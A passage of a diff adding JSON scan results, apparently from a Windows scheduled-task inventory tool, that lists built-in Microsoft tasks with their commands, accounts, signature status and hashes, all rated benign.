+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DUSM\\dusmtask",
+      "target": "C:\\WINDOWS\\System32\\dusmtask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "commande": "C:\\WINDOWS\\System32\\dusmtask.exe",
+        "signature": "Valid",
+        "sha256": "a966a0c5c014615c5bbd52648a0e0ce6774b6e70139a3522c9aa89d208ba4a1c"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\EDP\\EDP App Launch Task",
+      "target": "EDP App Launch Task",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\EDP\\EDP Auth Task",
+      "target": "EDP Auth Task",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\EDP\\EDP Inaccessible Credentials Task",
+      "target": "EDP Inaccessible Credentials Task",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\EDP\\StorageCardEncryption Task",
+      "target": "StorageCardEncryption Task",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
+      "target": "ExploitGuard MDM policy Refresh",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:8100bf382ab1",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Feedback\\Siuf\\DmClient",
+      "target": "C:\\WINDOWS\\system32\\dmclient.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c2f130e48a82",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\dmclient.exe",
+        "signature": "Valid",
+        "sha256": "96c29e56a8e5a60a09d9125683d29c24037fd5d40f4659bc2160b9daed20af6e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Feedback\\Siuf\\DmClientOnScenarioDownload",
+      "target": "C:\\WINDOWS\\system32\\dmclient.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c2f130e48a82",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\dmclient.exe utcwnf",
+        "signature": "Valid",
+        "sha256": "96c29e56a8e5a60a09d9125683d29c24037fd5d40f4659bc2160b9daed20af6e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\File Classification Infrastructure\\Property Definition Sync",
+      "target": "Property Definition Sync",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:fffaf8986a2e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\FileHistory\\File History (maintenance mode)",
+      "target": "File History (maintenance mode)",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:946b860d9ce2",
+        "compte": "S-1-5-19",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\BootstrapUsageDataReporting",
+      "target": "BootstrapUsageDataReporting",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:2384315cb096",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\GovernedFeatureUsageProcessing",
+      "target": "GovernedFeatureUsageProcessing",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a8603001142c",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\ReconcileConfigs",
+      "target": "ReconcileConfigs",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a8603001142c",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\ReconcileFeatures",
+      "target": "ReconcileFeatures",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a8603001142c",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\SafeguardsReconciliation",
+      "target": "SafeguardsReconciliation",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a8603001142c",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\UsageDataFlushing",
+      "target": "UsageDataFlushing",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2384315cb096",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\UsageDataReceiver",
+      "target": "UsageDataReceiver",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2384315cb096",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\FeatureConfig\\UsageDataReporting",
+      "target": "UsageDataReporting",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2384315cb096",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Flighting\\OneSettings\\RefreshCache",
+      "target": "RefreshCache",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:e47d9941c5bf",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Hotpatch\\Monitoring",
+      "target": "C:\\WINDOWS\\system32\\cmd.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\cmd.exe /d /c %systemroot%\\system32\\hpatchmonTask.cmd",
+        "signature": "Valid",
+        "sha256": "65ec268add3973b6dca64222985da47caeaee44a340b0ec1466782914fd743d9"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\InputSettingsRestoreDataAvailable",
+      "target": "InputSettingsRestoreDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\LocalUserSyncDataAvailable",
+      "target": "LocalUserSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\MouseSyncDataAvailable",
+      "target": "MouseSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\PenSyncDataAvailable",
+      "target": "PenSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\RemoteMouseSyncDataAvailable",
+      "target": "RemoteMouseSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\RemotePenSyncDataAvailable",
+      "target": "RemotePenSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\RemoteTouchpadSyncDataAvailable",
+      "target": "RemoteTouchpadSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\syncpensettings",
+      "target": "syncpensettings",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\input\\TouchpadSyncDataAvailable",
+      "target": "TouchpadSyncDataAvailable",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\InstallService\\RestoreDevice",
+      "target": "RestoreDevice",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\InstallService\\ScanForUpdates",
+      "target": "ScanForUpdates",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\InstallService\\ScanForUpdatesAsUser",
+      "target": "ScanForUpdatesAsUser",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\InstallService\\WakeUpAndContinueUpdates",
+      "target": "WakeUpAndContinueUpdates",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\InstallService\\WakeUpAndScanForUpdates",
+      "target": "WakeUpAndScanForUpdates",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\International\\Synchronize Language Settings",
+      "target": "Synchronize Language Settings",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c3ee03ce1ede",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Kernel\\La57Cleanup",
+      "target": "C:\\WINDOWS\\system32\\la57setup.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:8e26e4e027fd",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\la57setup.exe",
+        "signature": "Valid",
+        "sha256": "0df42e045bca512d9312e0ca7ac248b81e67824773476c6121e8f34e5ab5ee26"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\LanguageComponentsInstaller\\Installation",
+      "target": "Installation",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:fdb3f01cb7d6",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\LanguageComponentsInstaller\\ReconcileLanguageResources",
+      "target": "ReconcileLanguageResources",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:517a4b0c25bf",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Location\\WindowsActionDialog",
+      "target": "C:\\WINDOWS\\System32\\WindowsActionDialog.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "commande": "C:\\WINDOWS\\System32\\WindowsActionDialog.exe",
+        "signature": "Valid",
+        "sha256": "af82ae3f11202b226ce178cc15a93fb363aeb156b2b6fffbfd902eacadad91e1"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Maintenance\\WinSAT",
+      "target": "WinSAT",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:401afff53402",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Autopilot\\DetectHardwareChange",
+      "target": "DetectHardwareChange",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:8e79d50566e2",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Autopilot\\RemediateHardwareChange",
+      "target": "RemediateHardwareChange",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:8e79d50566e2",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Provisioning\\Cellular",
+      "target": "C:\\WINDOWS\\system32\\ProvTool.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ProvTool.exe /turn 7 /source CellStateChangeTask",
+        "signature": "Valid",
+        "sha256": "b4177d714d9de99f2041668ff2c36e1c32b3219da82cb285542ce07f99f93f12"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Provisioning\\Logon",
+      "target": "C:\\WINDOWS\\system32\\ProvTool.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ProvTool.exe /turn 5 /source LogonIdleTask",
+        "signature": "Valid",
+        "sha256": "b4177d714d9de99f2041668ff2c36e1c32b3219da82cb285542ce07f99f93f12"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Provisioning\\MdmDiagnosticsCleanup",
+      "target": "C:\\WINDOWS\\system32\\MdmDiagnosticsTool.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\MdmDiagnosticsTool.exe /clean",
+        "signature": "Valid",
+        "sha256": "9d106ece56d4ca894625b91a32b4b1732eaeedae28093e0bdb36e323f2fa8fd7"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Provisioning\\Retry",
+      "target": "C:\\WINDOWS\\system32\\ProvTool.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ProvTool.exe /turn 5 /source ProvRetryTask",
+        "signature": "Valid",
+        "sha256": "b4177d714d9de99f2041668ff2c36e1c32b3219da82cb285542ce07f99f93f12"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Management\\Provisioning\\RunOnReboot",
+      "target": "C:\\WINDOWS\\system32\\ProvTool.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\ProvTool.exe /turn 5 /source ContinueSessionTask",
+        "signature": "Valid",
+        "sha256": "b4177d714d9de99f2041668ff2c36e1c32b3219da82cb285542ce07f99f93f12"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Maps\\MapsToastTask",
+      "target": "MapsToastTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:41fa6c598e5f",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Maps\\MapsUpdateTask",
+      "target": "MapsUpdateTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:413731f77137",
+        "compte": "S-1-5-20",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\MemoryDiagnostic\\AutomaticOfflineMemoryDiagnostic",
+      "target": "AutomaticOfflineMemoryDiagnostic",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:480fd03a578d",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\MemoryDiagnostic\\ProcessMemoryDiagnosticEvents",
+      "target": "ProcessMemoryDiagnosticEvents",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:480fd03a578d",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\MemoryDiagnostic\\RunFullMemoryDiagnostic",
+      "target": "RunFullMemoryDiagnostic",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:480fd03a578d",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\MUI\\LPRemove",
+      "target": "C:\\WINDOWS\\system32\\lpremove.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2fb867097841",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\lpremove.exe",
+        "signature": "Valid",
+        "sha256": "88a27a07f124b8beff83e1f3df2c096c1902a9407021edf664e20dc0ac429a57"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Multimedia\\SystemSoundsService",
+      "target": "SystemSoundsService",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "running",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Network Connectivity Status Indicator\\NcsiIdentifyUserProxies",
+      "target": "NcsiIdentifyUserProxies",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\NlaSvc\\WiFiTask",
+      "target": "C:\\WINDOWS\\System32\\WiFiTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:082aa9f5d7b9",
+        "commande": "C:\\WINDOWS\\System32\\WiFiTask.exe nla",
+        "signature": "Valid",
+        "sha256": "828985c661c1120521b210504fa5c6953717a0f841cdb9bce4507c3cde94e4f6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Offline Files\\Background Synchronization",
+      "target": "Background Synchronization",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:27f68e9ed327",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Offline Files\\Logon Synchronization",
+      "target": "Logon Synchronization",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:27f68e9ed327",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\PCRPF\\PCR Prediction Framework Firmware Update Task",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe %windir%\\system32\\pcrpf.dll,NotifyFirmwareUpdateStaged",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\PerformanceTrace\\ShowFeedbackToast",
+      "target": "ShowFeedbackToast",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2cbe2e4b0817",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\PerformanceTrace\\WhesvcToast",
+      "target": "WhesvcToast",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:2cbe2e4b0817",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Plug and Play\\Device Install Group Policy",
+      "target": "Device Install Group Policy",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c5203e5f4b0b",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Plug and Play\\Device Install Reboot Required",
+      "target": "Device Install Reboot Required",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:eb5f228a4ecc",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Plug and Play\\Sysprep Generalize Drivers",
+      "target": "C:\\WINDOWS\\System32\\drvinst.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:528a0a497df4",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\System32\\drvinst.exe 6",
